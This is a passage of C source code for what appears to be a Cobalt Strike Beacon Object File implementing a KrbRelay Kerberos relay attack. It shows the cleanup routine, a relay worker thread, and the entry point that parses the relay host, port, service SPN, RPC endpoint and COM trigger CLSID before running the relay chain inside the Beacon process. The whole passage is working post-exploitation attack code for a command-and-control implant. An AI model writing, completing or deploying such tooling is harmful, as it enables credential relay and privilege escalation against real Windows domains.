    if(g_state.resolver_registered){RPCRT4$RpcServerUnregisterIf((RPC_IF_HANDLE)&resolver_interface,NULL,TRUE);g_state.resolver_registered=0;}
    remove_hook();
    wait_callback_quiescence();
    if(g_state.com_ready){OLE32$CoUninitialize();g_state.com_ready=0;}
    wait_callback_quiescence();
    release(g_state.continuation);g_state.continuation=NULL;
    if(g_state.bridge!=INVALID_SOCKET){WS2_32$closesocket(g_state.bridge);g_state.bridge=INVALID_SOCKET;}
    if(g_state.wsa_ready){WS2_32$WSACleanup();g_state.wsa_ready=0;}
}

static DWORD WINAPI relay_worker(LPVOID unused) {
    DWORD result=(DWORD)run_relay();(void)unused;
    cleanup_relay();
    return result;
}

void go(char *args, unsigned long alen) {
    /* Validate every packed endpoint before entering COM. In production this
       worker stays inside the invoking Beacon process for its full lifetime. */
    datap parser; char *value; int value_len=0,port,caller_com_releases;HANDLE worker=NULL;
    kzero(&g_state,sizeof(g_state));prepare_interfaces();g_state.initialized=1;g_state.bridge=INVALID_SOCKET;
#ifdef KRBRELAY_TEST_PREINITIALIZED_COM
    OLE32$CoInitializeEx(NULL,COINIT_APARTMENTTHREADED);
    OLE32$CoInitializeSecurity(NULL,-1,NULL,NULL,RPC_C_AUTHN_LEVEL_DEFAULT,RPC_C_IMP_LEVEL_IMPERSONATE,NULL,EOAC_DYNAMIC_CLOAKING,NULL);
#ifdef KRBRELAY_TEST_RESET_PREINITIALIZED_COM
    OLE32$CoUninitialize();
#endif
#endif
    caller_com_releases=release_caller_com_apartment();
    if(caller_com_releases)BeaconPrintf(CALLBACK_OUTPUT,"[*] Released %d retained COM apartment reference(s) on the Beacon task thread\n",caller_com_releases);
    if(!args||alen<4){g_state.stage=1;goto relay_done;}BeaconDataParse(&parser,args,(int)alen);
    value=BeaconDataExtract(&parser,&value_len);if(!value||value_len<2||value_len>(int)sizeof(g_state.relay_host)){g_state.stage=2;goto relay_done;}kcopy(g_state.relay_host,value,(ULONG)value_len);g_state.relay_host[value_len-1]=0;
    port=BeaconDataInt(&parser);if(port<1||port>65535){g_state.stage=3;goto relay_done;}g_state.relay_port=port;
    value=BeaconDataExtract(&parser,&value_len);if(!ascii_to_wide(value,value_len,g_state.service_spn,sizeof(g_state.service_spn)/sizeof(WCHAR))){g_state.stage=4;goto relay_done;}
    value=BeaconDataExtract(&parser,&value_len);if(!ascii_to_wide(value,value_len,g_state.rpc_host,sizeof(g_state.rpc_host)/sizeof(WCHAR))){g_state.stage=5;goto relay_done;}
    value=BeaconDataExtract(&parser,&value_len);if(!ascii_to_wide(value,value_len,g_state.rpc_endpoint,sizeof(g_state.rpc_endpoint)/sizeof(WCHAR))){g_state.stage=6;goto relay_done;}
    value=BeaconDataExtract(&parser,&value_len);if(!ascii_to_wide(value,value_len,g_state.trigger_clsid,sizeof(g_state.trigger_clsid)/sizeof(WCHAR))){g_state.stage=7;goto relay_done;}
    BeaconPrintf(CALLBACK_OUTPUT,"[*] KrbRelay direct BOF starting in the invoking process\n");
    worker=KERNEL32$CreateThread(NULL,0,relay_worker,NULL,0,NULL);if(!worker){g_state.stage=9;g_state.detail=(int)KERNEL32$GetLastError();goto relay_done;}KERNEL32$WaitForSingleObject(worker,INFINITE);KERNEL32$CloseHandle(worker);
relay_done: if(!g_state.success)BeaconPrintf(CALLBACK_ERROR,"[-] KrbRelay chain failed at stage %d (COM HRESULT 0x%08x), trace %d, callbacks %d\n",g_state.stage,(ULONG)g_state.detail,g_state.trace,g_state.callback_count);
    if(!worker)cleanup_relay();
}
